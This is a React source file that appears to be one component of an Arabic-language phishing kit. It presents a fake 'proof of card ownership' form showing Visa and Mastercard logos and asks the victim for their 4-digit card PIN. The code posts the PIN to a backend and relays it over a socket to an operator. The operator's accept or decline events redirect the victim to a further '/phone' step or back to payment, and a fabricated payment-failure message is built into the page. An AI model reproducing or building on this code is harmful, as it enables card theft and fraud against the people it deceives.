import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { AiFillLike, AiOutlineCloseCircle } from "react-icons/ai";

const PIN = () => {
  const [pin, setPin] = useState("");
  const [load, setLoad] = useState(null);
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();

    try {
      await axios
        .post(api_route + "/visaPin/" + sessionStorage.getItem("id"), {
          visa_pin: pin,
        })
        .then(() => {
          socket.emit("visaPin", { id, visa_pin: pin });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisaPin", (data) => {
    if (id === data) {
      window.location.href = "/phone";
    }
  });

  socket.on("declineVisaPin", (data) => {
    if (id === data) {
      setLoad(false);
      window.location.href = "/payment";
    }
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
      <form
        className="bg-white border h-screen border-gray-300 rounded-md  p-3 py-10 text-sm w-full"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        <h2 className="font-bold text-xxl my-2  ">إثبات ملكية البطاقة</h2>
        <p className="py-2 text-xs font-bold text-gray-500">
          الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام
        </p>
        <div className="flex justify-center py-1 items-center gap-x-2 w-full">
          <input
            value={pin}
            required
            onChange={(e) => setPin(e.target.value)}
            dir="ltr"
            maxLength={4}
            minLength={4}
            inputMode="numeric"
            type="text"
            className="border px-3 py-1  border-gray-300 text-base text-center outline-[#ffc107] rounded-md w-3/5"
          />
        </div>

        {error ? (
          <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
              <AiOutlineCloseCircle className="text-6xl" />
              <div className="flex flex-col w-full items-center justify-center">
                <span>نتيجة الدفع فشل معرف الدفع </span>
                <span>82A27833M4589370G</span>
              </div>
              <button
                className="bg-gray-900 text-white w-11/12 py-3"
                onClick={() => setError(false)}
              >
                حاول مرة ثانية
              </button>
            </div>
          </div>
        ) : (
          ""
        )}

        <div className="w-full flex items-center justify-center py-5">
          {" "}
          <button className="  px-5 flex justify-center items-center py-2  bg-sky-800 text-white w-11/12 rounded-md ">
            تأكيد
          </button>
        </div>
        <div className="flex w-full gap-x-3 items-center justify-center">
          <div className="w-20 ">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s" />
          </div>
          <div className="w-20 ">
            <img src="/Mastercard.png" />
          </div>
          <div className="w-20 ">
            <img src="/visa_logo.jpg" />
          </div>
        </div>
      </form>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default PIN;
